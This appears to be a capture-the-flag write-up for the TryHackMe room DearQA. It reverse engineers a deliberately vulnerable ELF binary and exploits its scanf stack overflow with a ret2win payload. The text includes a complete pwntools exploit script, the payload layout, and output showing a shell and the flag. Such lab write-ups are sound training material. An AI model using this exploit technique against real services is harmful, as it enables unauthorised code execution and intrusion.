# TryHackMe — DearQA | Writeup

![Category](https://img.shields.io/badge/Category-Pwn%20%2F%20Binary%20Exploitation-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![Technique](https://img.shields.io/badge/Technique-ret2win-orange)

> **Room:** [DearQA](https://tryhackme.com/room/dearqa)
> **Category:** Binary Exploitation / Reverse Engineering
> **Objective:** Reverse engineer a provided ELF binary, exploit a stack-based buffer overflow on a remote service, and retrieve the flag.

---

## 📑 Table of Contents

- [Overview](#-overview)
- [Enumeration](#-enumeration)
- [Static Analysis](#-static-analysis)
- [Disassembly](#-disassembly)
- [Vulnerability Analysis](#-vulnerability-analysis)
- [Exploitation Strategy](#-exploitation-strategy)
- [Building the Exploit](#-building-the-exploit)
- [Execution and Flag](#-execution-and-flag)
- [Lessons Learned](#-lessons-learned)
- [References](#-references)

---

## 🎯 Overview

This room provides an ELF64 binary and a remote service running on port `5700`. The task involves:

1. Identifying the binary architecture
2. Analyzing protection mechanisms
3. Discovering the vulnerability
4. Building a working exploit to obtain the flag

**TL;DR:** The binary is a 64-bit ELF with all protections disabled. It contains a function that calls `execve("/bin/bash", NULL, NULL)`, and the `main` function has a classic stack buffer overflow via `scanf("%s", buf)`. This is a textbook **ret2win** scenario.

---

## 🔍 Enumeration

### Target Information

| Field | Value |
|-------|-------|
| Host | `10.65.176.170` |
| Port | `5700` |
| Binary | `DearQA-1627223337406.DearQA` |

### Initial Connection

```bash
nc 10.65.176.170 5700
```

Output:
```
Welcome dearQA
I am sysadmin, i am new in developing
What's your name:
```

The service prompts for user input — a classic stdin-based binary challenge.

---

## 🧪 Static Analysis

### File Type

```bash
$ file ./DearQA-1627223337406.DearQA
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```

**Key observations:**
- **Architecture:** x86-64 (amd64 / x64)
- **Linkage:** Dynamically linked
- **Symbols:** Not stripped — function names are preserved (excellent for analysis)

### Security Mitigations (`checksec`)

```bash
$ checksec --file=./DearQA-1627223337406.DearQA
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

### Protection Analysis

| Protection | Status | Impact on Exploitation |
|------------|--------|------------------------|
| **RELRO** | ❌ None | GOT is writable — GOT overwrite is possible |
| **Stack Canary** | ❌ None | Stack overflow will not be detected |
| **NX** | ❌ Disabled | Shellcode on the stack would execute |
| **PIE** | ❌ Disabled | All addresses are static (`0x400000` base) |
| **RWX segments** | ⚠️ Present | Memory regions are both writable and executable |

This is a **deliberately vulnerable** binary — every modern mitigation is turned off. Multiple exploitation paths are viable; we will choose the simplest one.

### Strings of Interest

```bash
$ strings ./DearQA-1627223337406.DearQA
...
execve
Congratulations!
You have entered in the secret function!
/bin/bash
Welcome dearQA
I am sysadmin, i am new in developing
What's your name:
Hello: %s
...
```

Two strings stand out:
- `"Congratulations! You have entered in the secret function!"`
- `"/bin/bash"`

Together with the presence of `execve` in the imports, this strongly hints that the binary already contains a hidden function which spawns a shell.

### Symbol Table

```bash
$ nm ./DearQA-1627223337406.DearQA | grep " T "
00000000004007a4 T _fini
00000000004004f0 T _init
00000000004007a0 T __libc_csu_fini
0000000000400730 T __libc_csu_init
00000000004006c3 T main
0000000000400590 T _start
0000000000400686 T vuln
```

Two user-defined functions:
- `main` @ `0x4006c3`
- `vuln` @ `0x400686`

Despite its name, the `vuln` function is **not** the one containing the vulnerability — as we will see, it is actually the "win" function.

---

## 🔬 Disassembly

### Function `vuln` — The Win Function

```asm
0000000000400686 <vuln>:
  400686: push   rbp
  400687: mov    rbp, rsp
  40068a: mov    edi, 0x4007b8            ; "Congratulations!"
  40068f: call   puts@plt
  400694: mov    edi, 0x4007d0            ; "You have entered..."
  400699: call   puts@plt
  40069e: mov    rax, QWORD PTR [rip+0x20056b]   ; stdout
  4006a5: mov    rdi, rax
  4006a8: call   fflush@plt
  4006ad: mov    edx, 0x0                 ; envp = NULL
  4006b2: mov    esi, 0x0                 ; argv = NULL
  4006b7: mov    edi, 0x4007f9            ; pathname = "/bin/bash"
  4006bc: call   execve@plt               ; execve("/bin/bash", NULL, NULL)
  4006c1: pop    rbp
  4006c2: ret
```

This function is a gift from the developer. It:

1. Prints congratulation messages
2. Calls `execve("/bin/bash", NULL, NULL)` — spawning a shell

Confirming the `/bin/bash` string location in `.rodata`:

```
4007f0: 756e6374 696f6e21 002f6269 6e2f6261  unction!./bin/ba
400800: 7368 0057 656c 636f 6d65 2064 6561 7251 sh.Welcome dearQ
```

Address `0x4007f9` indeed points to `"/bin/bash"`. ✅

### Function `main` — The Vulnerable Function

```asm
00000000004006c3 <main>:
  4006c3: push   rbp
  4006c4: mov    rbp, rsp
  4006c7: sub    rsp, 0x20                ; Allocate 32 bytes for local buffer
  4006cb: mov    edi, 0x400803            ; "Welcome dearQA"
  4006d0: call   puts@plt
  4006d5: mov    edi, 0x400818            ; "I am sysadmin..."
  4006da: call   puts@plt
  4006df: mov    edi, 0x40083e            ; "What's your name: "
  4006e4: mov    eax, 0x0
  4006e9: call   printf@plt
  ...
  (continues with scanf and output of the input)
```

The critical line is:

```asm
4006c7: sub    rsp, 0x20    ; 0x20 = 32 bytes
```

The `main` function allocates **32 bytes** on the stack for local variables. The remaining disassembly contains a call to `__isoc99_scanf` with the `"%s"` format specifier, which performs **unbounded input reading** directly into this 32-byte buffer.

---

## 🐛 Vulnerability Analysis

### Root Cause

The binary uses `scanf("%s", buf)` with no length restriction. The `%s` specifier in `scanf` reads until whitespace or EOF — it does **not** respect the buffer size. Combined with the absence of a stack canary and executable `.text` at fixed addresses, this yields a straightforward stack buffer overflow.

### Stack Layout of `main`

```
High addresses
┌──────────────────────────┐
│     Return address       │  ← 8 bytes (RIP)  <── our target
├──────────────────────────┤
│     Saved RBP            │  ← 8 bytes
├──────────────────────────┤
│                          │
│     Local buffer         │  ← 32 bytes
│     (scanf input)        │
│                          │
└──────────────────────────┘
Low addresses                    ← RSP after prologue
```

### Offset Calculation

To overwrite the return address (RIP):

```
offset_to_RIP = buffer_size + saved_RBP
offset_to_RIP = 32 + 8
offset_to_RIP = 40 bytes
```

So the payload structure is:

```
[ 32 bytes padding ][ 8 bytes overwriting RBP ][ 8 bytes overwriting RIP ]
```

---

## 🧭 Exploitation Strategy

Because all mitigations are disabled and a `win` function is already present, the simplest technique is **ret2win**:

1. Overflow the 32-byte buffer in `main`
2. Overwrite the saved RBP (8 bytes — any value works)
3. Overwrite the return address with the address of `vuln` (`0x400686`)
4. When `main` returns, execution jumps to `vuln`, which calls `execve("/bin/bash", NULL, NULL)` — granting a shell

### Why ret2win works here

| Required condition | Status |
|---------------------|--------|
| Stack overflow is exploitable | ✅ No canary |
| RIP control is reliable | ✅ No canary, no stack integrity check |
| Target address is static | ✅ No PIE (base `0x400000`) |
| Win function exists in the binary | ✅ `vuln` @ `0x400686` |

---

## 💻 Building the Exploit

Full exploit using `pwntools`:

```python
#!/usr/bin/env python3
from pwn import *

# Target configuration
HOST = '10.65.176.170'
PORT = 5700
BINARY = './DearQA-1627223337406.DearQA'

# Architecture setup
context.arch = 'amd64'
context.log_level = 'info'

# Key addresses
WIN_ADDR = 0x400686     # Address of vuln() -> calls execve("/bin/bash")

# Payload construction
# [32 bytes buffer][8 bytes saved RBP][8 bytes return address]
payload  = b'A' * 32
payload += b'B' * 8
payload += p64(WIN_ADDR)

log.info(f"Payload length: {len(payload)} bytes")
log.info(f"Jumping to vuln @ {hex(WIN_ADDR)}")

# Connect and deliver the payload
io = remote(HOST, PORT)
print(io.recvuntil(b'name: ').decode())
io.sendline(payload)

# Drop into an interactive shell
io.interactive()
```

### Payload Breakdown

| Offset | Size | Content | Purpose |
|--------|------|---------|---------|
| `0x00` | 32 bytes | `AAAA...A` | Fill local buffer |
| `0x20` | 8 bytes | `BBBBBBBB` | Overwrite saved RBP |
| `0x28` | 8 bytes | `\x86\x06\x40\x00\x00\x00\x00\x00` | Overwrite RIP with `vuln` (little-endian) |

### Endianness Note

x86-64 is little-endian, so the address `0x400686` is written in memory as:

```
Byte order in memory: 86 06 40 00 00 00 00 00
```

`pwntools`' `p64()` handles this automatically.

---

## 🚀 Execution and Flag

### Running the Exploit

```bash
$ python3 exploit.py
[+] Opening connection to 10.65.176.170 on port 5700: Done
Welcome dearQA
I am sysadmin, i am new in developing
What's your name:
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86^F@^@^@^@^@^@
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06@
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group (659): Inappropriate ioctl for device
bash: no job control in this shell
ctf@ip-10-65-176-170:/home/ctf$
```

The exploit worked — `main`'s return address was successfully overwritten, and the `vuln` function executed `execve("/bin/bash")`.

> **Note on the warning:** `cannot set terminal process group` / `no job control` is expected when spawning `/bin/bash` without a proper PTY. The shell is fully functional for command execution.

### Post-Exploitation

```bash
$ ls -la
total 40
drwxr-xr-x 2 ctf  ctf  4096 Jul 24  2021 .
drwxr-xr-x 5 root root 4096 Apr 18 15:10 ..
-rw------- 1 ctf  ctf   619 Jul 24  2021 .bash_history
-rw-r--r-- 1 ctf  ctf   220 Jul 24  2021 .bash_logout
-rw-r--r-- 1 ctf  ctf  3515 Jul 24  2021 .bashrc
-rw-r--r-- 1 ctf  ctf   675 Jul 24  2021 .profile
-r-xr-xr-x 1 ctf  ctf  7712 Jul 24  2021 DearQA
-rwx------ 1 root root  413 Jul 24  2021 dearqa.c
-r--r--r-- 1 ctf  ctf    22 Jul 24  2021 flag.txt

$ cat flag.txt
THM{PWN_1S_V3RY_E4SY}
```

### 🚩 Flag

```
THM{PWN_1S_V3RY_E4SY}
```

---

## 📚 Lessons Learned

### Technical takeaways

1. **Buffer overflow fundamentals.** When a binary reads user-controlled input into a fixed-size stack buffer without bounds checking (`gets`, `scanf("%s")`, `strcpy`, etc.), an attacker can overwrite adjacent memory — including the saved return address.

2. **Mitigation triage via `checksec`.** Before writing any exploit, inspect protection mechanisms. The absence/presence of NX, PIE, canary, and RELRO dictates which exploitation techniques are viable.

3. **The ret2win technique.** When a binary already contains a function that performs the desired action (here, spawning a shell), the simplest exploit is to redirect execution there. No shellcode or ROP required.

4. **Stack frame layout on x86-64.** For a function with an `N`-byte local buffer, the offset from the buffer start to the saved return address is `N + 8` (accounting for the saved RBP).

5. **Little-endian address encoding.** Addresses are written in memory least-significant-byte first. `pwntools.p64()` abstracts this detail.

### Methodological takeaways

1. **Always enumerate before exploiting.** `file`, `checksec`, `strings`, and `nm` often reveal the entire strategy before writing a single line of exploit code.

2. **Read the disassembly.** The size of the local stack frame (`sub rsp, 0x20`) gives the buffer size; the list of called functions reveals the attack surface.

3. **Suggestive function names are not reliable.** Here, `vuln` turned out to be the win function, and `main` contained the vulnerability. Always verify with disassembly.

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `file` | Detect binary architecture |
| `checksec` (pwntools) | Inspect binary security mitigations |
| `strings` | Extract printable strings |
| `nm` | List binary symbols |
| `objdump -d -M intel` | Disassemble the binary |
| `nc` | Raw TCP interaction |
| `pwntools` (Python) | Exploit construction and delivery |

---

## 📖 References

- [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)
- [CWE-242: Use of Inherently Dangerous Function](https://cwe.mitre.org/data/definitions/242.html)
- [pwntools documentation](https://docs.pwntools.com/en/stable/)
- [Aleph One — "Smashing The Stack for Fun and Profit" (Phrack 49)](http://phrack.org/issues/49/14.html)
- [x86-64 calling conventions — System V AMD64 ABI](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf)

---

## 🏷️ Tags

`#tryhackme` `#pwn` `#binary-exploitation` `#buffer-overflow` `#ret2win` `#pwntools` `#x86-64` `#reverse-engineering`

---

*Writeup by Artem — Happy hacking! 🔓*
